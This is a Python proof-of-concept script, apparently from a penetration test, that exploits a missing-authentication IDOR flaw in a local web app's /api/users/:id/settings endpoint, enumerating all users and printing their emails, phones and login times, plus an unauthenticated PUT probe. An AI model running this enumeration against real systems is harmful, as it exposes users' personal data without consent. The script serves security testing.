#!/usr/bin/env python3
"""
WSTG-ATHZ-04: User Settings IDOR (Insecure Direct Object Reference)

Vulnerability: GET /api/users/:id/settings has no authentication middleware.
The route was "built early, before the auth middleware pattern was standardized"
(per code comment in users.routes.js line 14). This allows any unauthenticated
attacker to access any user's settings, which include PII such as email, phone,
last login time, and other private profile data.

Impact: Full PII disclosure for every user on the platform without any credentials.
"""

import requests
import sys

BASE_URL = "http://localhost:3000"


def main():
    print("=" * 70)
    print("WSTG-ATHZ-04: User Settings IDOR - No Auth on /api/users/:id/settings")
    print("=" * 70)

    # Step 1: Get the list of users (also public, no auth needed)
    print("\n[1] Fetching user list from GET /api/users (public, no auth)...")
    resp = requests.get(f"{BASE_URL}/api/users")
    if resp.status_code != 200:
        print(f"    FAIL: Could not fetch users. Status: {resp.status_code}")
        sys.exit(1)

    data = resp.json()
    users = data.get("users", [])
    print(f"    Found {len(users)} users")

    if not users:
        print("    No users found. Is the application seeded?")
        sys.exit(1)

    # Step 2: For each user, access their settings WITHOUT authentication
    print("\n[2] Accessing each user's private settings WITHOUT authentication...\n")

    leaked_count = 0
    for user in users:
        user_id = user["id"]
        display_name = user.get("display_name", "Unknown")
        role = user.get("role", "unknown")

        settings_resp = requests.get(f"{BASE_URL}/api/users/{user_id}/settings")

        if settings_resp.status_code == 200:
            settings = settings_resp.json().get("settings", {})
            leaked_count += 1
            email = settings.get("email", "N/A")
            phone = settings.get("phone", "N/A")
            last_login = settings.get("last_login", "N/A")
            timezone = settings.get("timezone", "N/A")

            print(f"    [LEAKED] {display_name} ({role})")
            print(f"             Email: {email}")
            print(f"             Phone: {phone}")
            print(f"             Timezone: {timezone}")
            print(f"             Last Login: {last_login}")
            print()
        else:
            print(f"    [OK] {display_name} - settings protected (status {settings_resp.status_code})")

    # Step 3: Verify that updating settings DOES require auth (to confirm the gap)
    print("-" * 70)
    print("\n[3] Confirming PUT /api/users/:id/settings requires auth (it should)...")
    if users:
        target_id = users[0]["id"]
        put_resp = requests.put(
            f"{BASE_URL}/api/users/{target_id}/settings",
            json={"phone": "555-HACKED"}
        )
        print(f"    PUT without auth returned status: {put_resp.status_code}")
        if put_resp.status_code == 401:
            print("    Confirmed: PUT requires auth, but GET does not - inconsistent access control!")

    # Summary
    print("\n" + "=" * 70)
    print("RESULT:")
    if leaked_count > 0:
        print(f"  VULNERABLE - Leaked private settings for {leaked_count}/{len(users)} users")
        print("  No authentication required to read email, phone, and other PII.")
    else:
        print("  NOT VULNERABLE - All settings endpoints returned non-200 status.")
    print("=" * 70)


if __name__ == "__main__":
    main()
